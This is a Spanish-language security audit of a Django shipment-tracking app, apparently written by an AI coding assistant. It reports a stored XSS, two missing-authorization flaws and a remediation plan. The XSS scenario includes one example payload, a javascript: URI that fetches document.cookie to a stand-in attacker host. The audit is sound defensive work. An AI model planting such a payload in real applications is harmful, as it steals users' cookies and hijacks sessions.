# Auditoría de seguridad — Tracking Guide

Fecha: 2026-09-14
Alcance: revisión de seguridad de código completo (`guides/`, `tracking_guide/`), dado que no había diff pendiente en la rama (`main` está al día, sin cambios de código). Metodología: identificación de candidatos + verificación independiente de cada uno contra el código real, con umbral de confianza ≥8/10 para incluir en el reporte final. Se descartaron 2 candidatos por no cumplir el umbral (ver "Descartados" al final).

## Resumen

| # | Hallazgo | Severidad | Archivo:línea | Confianza |
|---|---|---|---|---|
| 1 | XSS almacenado vía `map_link` (`javascript:` URI) | Alta | `guides/views.py:270,295-296,1062,1068` + 4 templates | 9/10 |
| 2 | `guide_detail` sin control de rol — acceso total para cuentas sin grupo asignado | Alta | `guides/views.py:345-357` | 8/10 |
| 3 | `search_client_by_rut` expone PII de clientes a cualquier usuario autenticado | Media | `guides/views.py:234-256` | 9/10 |

---

# Vuln 1: XSS almacenado en `map_link`: `guides/views.py:270,295-296`

* Severidad: Alta
* Categoría: `stored_xss`
* Descripción: `map_link` se toma directo de `request.POST` en `create_guide` (`guides/views.py:270,295-296`) y en `update_guide_address` (`guides/views.py:1062,1068`) y se guarda con `guide.save()` sin pasar por validación. Aunque el modelo lo declara como `URLField` (`guides/models.py:94`), ese validador de esquema (`http`/`https`) solo se ejecuta vía `full_clean()`/`ModelForm`, y `map_link` está explícitamente excluido de `CreateDispatchGuideForm.Meta.fields` (`guides/forms.py:47`) — así que el `save()` nunca lo valida. El valor se renderiza luego como `href` sin escapar el esquema en `guide_list.html:660`, `guide_detail.html:427`, `transportista_guides.html:336`, `transportista_guide_detail.html:408` (el autoescape de Django solo neutraliza `< > & " '`, no esquemas de URL como `javascript:`). Además, `guide_list.html:780-782` inyecta el mismo valor sin sanitizar vía concatenación de string en `innerHTML`, un segundo vector independiente del autoescape de templates. No hay CSP configurada en el proyecto que mitigue la ejecución de `javascript:` URIs.
* Escenario de explotación: `create_guide`/`update_guide_address` están protegidos por `admin_or_coordinador_required`, es decir, un usuario con rol **Coordinador** (menor privilegio que Admin) puede guardar `map_link = "javascript:fetch('https://atacante.example/x?c='+document.cookie)"` en cualquier guía. Cuando un **Admin**, otro Coordinador, o un **Transportista** abre esa guía y hace clic en "Ver en Google Maps"/"📍 Mapa", el script se ejecuta en el origen autenticado de la víctima — con acceso a la cookie CSRF (no `HttpOnly` por defecto en Django) para emitir solicitudes autenticadas en su nombre. Es una escalada de privilegio horizontal-a-vertical (Coordinador → Admin).
* Recomendación: Validar `map_link` en el servidor antes de guardar (aceptar solo `http://`/`https://`, reutilizando el patrón `_URL_RE = re.compile(r'https?://\S+')` que ya existe en el importador Excel, o invocando `URLValidator`). Corregir también la construcción del enlace vía `innerHTML` en `guide_list.html:780-782` para usar `textContent`/APIs DOM en vez de concatenación de string sin escapar.

---

# Vuln 2: Falta de control de rol en `guide_detail`: `guides/views.py:345-357`

* Severidad: Alta
* Categoría: `broken_access_control` (CWE-862, missing authorization)
* Descripción: La vista solo usa `@login_required`. El único chequeo de rol dentro de la función es `if is_transportista(request.user) and guide.transportista != request.user: deny` — nunca verifica `is_staff` ni pertenencia al grupo `Coordinador`. Cualquier `User` activo que sea `is_staff=False` y no pertenezca al grupo `Transportista` (por ejemplo, una cuenta creada manualmente en el admin de Django para otro propósito, sin marcar grupo) atraviesa el único filtro sin restricción, llegando tanto al `GET` como al `POST` (`guides/views.py:375-415`), que transiciona el estado de la guía (incluyendo cerrarla), sube fotos y dispara los correos de notificación a vendedor/coordinador. Es la única vista de gestión de guías en `views.py` que no usa el decorador `admin_or_coordinador_required` ya existente y usado en `hub`, `guide_list`, `transportista_report`, etc. — un patrón consistente en el resto del archivo que aquí falta.
* Escenario de explotación: `guide_id` es un entero autoincremental en la URL (`/guias/<int:guide_id>/`), trivialmente enumerable. No hay flujo de autoregistro en la app — todos los usuarios se crean manualmente vía el admin de Django (`CustomUserAdmin`), y aunque el formulario de creación incluye `is_staff`/`groups`, nada obliga a marcarlos. Una cuenta así ("huérfana", sin grupo) queda de hecho bloqueada de la navegación normal (`hub`/`transportista_guides`/`guide_list` redirigen en bucle porque todos exigen rol), pero puede acceder directamente por URL a `/guias/<id>/` para cualquier ID, obteniendo lectura, subida de fotos y transición de estado sobre **cualquier** guía del sistema, incluyendo disparar correos a clientes/coordinadores en nombre del sistema.
* Recomendación: Reemplazar el chequeo negativo (solo excluye transportistas ajenos) por una lista blanca explícita de los tres roles legítimos, por ejemplo:
  ```python
  if not (request.user.is_staff or is_coordinador(request.user) or is_transportista(request.user)):
      messages.error(request, 'No tienes permisos para acceder a esta guía.')
      return redirect(get_home_url_for_user(request.user))
  ```
  colocado antes del chequeo de propiedad del transportista.

---

# Vuln 3: `search_client_by_rut` sin restricción de rol: `guides/views.py:234-256`

* Severidad: Media
* Categoría: `broken_access_control` / `sensitive_data_exposure`
* Descripción: A diferencia de las demás vistas de gestión de clientes/guías, esta vista (ruta `clientes/buscar/`, `guides/urls.py:9`) solo tiene `@login_required` + `@require_POST`, sin `admin_or_coordinador_required`. Devuelve `nombre`, `direccion_facturacion` y `direccion_entrega_preferida` del cliente para cualquier `rut` recibido por POST, o un 404 que confirma/niega la existencia del RUT. `admin_or_coordinador_required` (`guides/decorators.py`) excluye explícitamente a usuarios que no son staff ni pertenecen a `Coordinador` — es decir, un **Transportista** (rol pensado para ver solo sus propias guías asignadas) es un usuario de sesión web normal y autenticado que puede llamar este endpoint directamente sin pasar por la UI de creación de guías.
* Escenario de explotación: Un transportista autenticado hace `POST /clientes/buscar/` con RUTs arbitrarios (el RUT chileno tiene un esquema de numeración conocido/adivinable) y obtiene, en una sola solicitud (sin necesidad de fuerza bruta), el nombre de la empresa y ambas direcciones (facturación y entrega preferida) de cualquier cliente, incluidos aquellos sin relación con sus entregas asignadas — exposición de PII de clientes fuera del alcance de su rol.
* Recomendación: Agregar `@admin_or_coordinador_required` a esta vista, igual que en `create_guide` y demás vistas de gestión de clientes. Si algún flujo de transportista necesita esta búsqueda, acotar la respuesta a solo los clientes de guías que ya tiene asignadas.

---

## Descartados (no alcanzan el umbral de confianza ≥8)

| Candidato | Confianza | Motivo |
|---|---|---|
| `SECRET_KEY` con fallback hardcodeado en `settings.py:11-14` | 3/10 | `render.yaml` fija `generateValue: true` para `SECRET_KEY` en los 3 servicios reales de despliegue — el fallback es estructuralmente inalcanzable en producción tal como está configurado. Queda como mejora de higiene (fallar rápido si falta la env var), no como vulnerabilidad explotable. |
| JWT refresh tokens sin blacklist/revocación (`SIMPLE_JWT`, `settings.py`) | 3/10 | Es el comportamiento estándar de `simplejwt` sin el app opcional `token_blacklist` instalado — ausencia de hardening común en la industria, no una falla activa introducida por este código. |

---

## Plan de mitigación

Orden de prioridad por severidad y facilidad de explotación. Los 3 hallazgos son cambios acotados (decorador + validación), no requieren cambios de arquitectura.

### Fase 1 — Fixes inmediatos (mismo día, bajo riesgo de regresión)

1. **Vuln 3 — `search_client_by_rut`** (~5 min): agregar `@admin_or_coordinador_required` sobre la vista, igual que sus vistas hermanas. Es un cambio de una línea, sin efecto en el flujo legítimo (`create_guide.html` ya se usa solo por admin/coordinador).
2. **Vuln 2 — `guide_detail`** (~15 min + prueba manual): reemplazar el chequeo negativo por la lista blanca de roles propuesta arriba. Requiere probar los 3 flujos existentes (admin, coordinador, transportista dueño de la guía) para confirmar que ninguno queda bloqueado por error — es el cambio con más superficie de regresión porque toca la vista más usada del sistema.
3. **Vuln 1 — XSS en `map_link`** (~30-45 min): 
   - Servidor: validar el esquema (`http://`/`https://`) en `create_guide` y `update_guide_address` antes de `guide.save()`, reutilizando `_URL_RE` del importador o `django.core.validators.URLValidator`. Rechazar/ignorar valores que no cumplan, igual que ya se hace en la importación Excel.
   - Frontend: corregir `guide_list.html:780-782` para no construir el `href` vía concatenación en `innerHTML` sin sanitizar.
   - Opcional pero recomendado: sanitizar también los `map_link` ya almacenados en la base (migración de datos de una sola vez) para eliminar payloads que ya pudieran existir.

### Fase 2 — Verificación

- Test manual dirigido por rol: confirmar que un usuario Transportista ya no puede llegar a `/clientes/buscar/` (403/redirect) ni a `/guias/<id>/` de una guía ajena.
- Confirmar que un `map_link` con esquema `javascript:` es rechazado al guardar (tanto en creación como en edición de dirección) y que uno con `https://` sigue funcionando normalmente.
- Dado que `guides/tests.py` está vacío (hallazgo ya documentado en `AUDITORIA.md`), aprovechar este fix para agregar 3 tests de regresión con `Client()` de Django: (a) transportista → 403/redirect en `search_client_by_rut`; (b) usuario sin grupo → 403/redirect en `guide_detail`; (c) `map_link` con esquema no-http rechazado. Bajo costo, y cierra la vía más barata para que esto no vuelva a filtrarse sin aviso.

### Fase 3 — Seguimiento

- Revisar si existen cuentas de usuario reales en producción sin grupo asignado (Vuln 2 depende de que ese estado sea alcanzable) — consultarlo directamente en el admin de Django o con una query rápida (`User.objects.filter(is_staff=False).exclude(groups__name__in=['Coordinador','Transportista'])`).
- Revisar si hay guías con `map_link` ya almacenado con esquema no-http (limpieza de datos si corresponde).

¿Empiezo a implementar los 3 fixes de la Fase 1 ahora?
